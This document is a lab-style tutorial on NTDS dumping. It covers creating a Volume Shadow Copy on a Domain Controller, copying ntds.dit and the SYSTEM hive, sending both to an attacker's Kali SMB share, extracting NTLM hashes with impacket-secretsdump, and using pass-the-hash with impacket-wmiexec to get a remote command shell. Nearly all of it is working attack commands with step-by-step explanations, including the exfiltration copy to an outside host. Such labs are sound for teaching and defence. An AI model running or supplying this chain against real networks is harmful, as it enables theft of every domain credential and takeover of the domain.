# NTDS Dumping via Volume Shadow Copy

## Overview

**NTDS Dumping** is a **Post-Exploitation** technique used in Active Directory environments to extract credential material from a **Domain Controller**.

The Active Directory database is stored in:

```
C:\Windows\NTDS\ntds.dit
```

The `ntds.dit` database contains information about Domain accounts, including password-related data such as **NTLM hashes**.

Because `ntds.dit` is actively used by the Domain Controller, we can use a **Volume Shadow Copy** to obtain a consistent copy of the database.

---

# Lab

## Step 1: Create a Volume Shadow Copy

First, create a Shadow Copy of the `C:` drive:

```
vssadmin create shadow /for=C:
```

### What does this command do?

`vssadmin` is the Windows command-line tool for managing **Volume Shadow Copies**.

The command:

```
create shadow /for=C:
```

creates a snapshot of the `C:` volume.

We use a Shadow Copy because `ntds.dit` is normally being used by Active Directory, so obtaining a copy through the Shadow Copy allows us to access a consistent version of the database.

A successful result provides a path similar to:

```
Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
```

> The number at the end can be different. Always use the path returned by your system.

---

## Step 2: List the Shadow Copies

To view the available Shadow Copies:

```
vssadmin list shadows
```

### What does this command do?

It displays information about the Shadow Copies currently available on the system.

The important part is:

```
Shadow Copy Volume:
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
```

This path represents the snapshot of the `C:` drive that we created.

We will use this path to access `ntds.dit` from the Shadow Copy.

---

## Step 3: Copy `ntds.dit`

Using the Shadow Copy path, copy the Active Directory database:

```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Users\user1\Documents\ntds.dit
```

### What does this command do?

The source is:

```
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit
```

This is the `ntds.dit` file inside the Shadow Copy.

The destination is:

```
C:\Users\user1\Documents\ntds.dit
```

So the command effectively does:

```
Shadow Copy
    ↓
ntds.dit
    ↓
C:\Users\user1\Documents\
```

We now have a copy of the Active Directory database that can later be transferred to Kali.

---

## Step 4: Save the SYSTEM Registry Hive

Next, save the `SYSTEM` registry hive:

```
reg save HKLM\SYSTEM C:\Users\user1\Documents\SYSTEM
```

### What does this command do?

`reg save` saves a Windows Registry hive to a file.

Here:

```
HKLM\SYSTEM
```

refers to the **SYSTEM registry hive**.

The destination is:

```
C:\Users\user1\Documents\SYSTEM
```

We need both files:

```
ntds.dit
SYSTEM
```

The `SYSTEM` hive provides information required by `secretsdump` when processing the `ntds.dit` database.

---

## Step 5: Verify the Files

Check that both files exist:

```
dir C:\Users\user1\Documents\
```

We should see:

```
ntds.dit
SYSTEM
```

At this point, we have the two files required for offline extraction.

---

# Step 6: Prepare a Share on Kali

On Kali, create a directory:

```
mkdir Share
cd Share
```

---

## Step 7: Start an SMB Server

Start an SMB server using Impacket:

```
impacket-smbserver -smb2support Share .
```

---

# Step 8: Transfer `ntds.dit`

From the Domain Controller:

```
copy ntds.dit \\192.168.227.136\Share\ntds.dit

```

---

# Step 9: Transfer the SYSTEM Hive

Copy the second file:

```
copy SYSTEM \\192.168.227.136\Share\SYSTEM
```

---

# Step 11: Extract the NTLM Hashes

run:

```
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

### What does this command do?

`secretsdump` is an Impacket tool used to extract credential material from Windows systems.

The arguments mean:

```
-ntds ntds.dit
```

Use the `ntds.dit` database as the NTDS source.

```
-system SYSTEM
```

Use the saved `SYSTEM` registry hive.

```
LOCAL
```

Process the files locally instead of connecting to a remote Windows machine.

The output can look similar to:

```
Administrator:500:aad3b435b51404eead3b435b51404ee:NTLM_HASH:::
```

The general format is:

```
USERNAME:RID:LM_HASH:NTLM_HASH
```

The **NTLM Hash** is the fourth field.

---

# Step 12: Use the NTLM Hash for Pass-the-Hash

After obtaining a valid NTLM hash, it can be used for authentication without knowing the plaintext password.

For example:

```
impacket-wmiexec administrator@192.168.227.139 -hashes :NTLM_HASH
```

### What does this command do?

`wmiexec` uses **WMI** to execute commands remotely.

Instead of providing:

```
Administrator's password
```

we provide:

```
Administrator's NTLM hash
```

The option:

```
-hashes :NTLM_HASH
```

specifies the NTLM hash.

The empty value before the colon means that an LM hash was not provided:

```
-hashes :NTHASH
```

This technique is known as:

**Pass-the-Hash (PtH)**.

If authentication succeeds and the account has sufficient permissions, we receive a remote command shell.

---
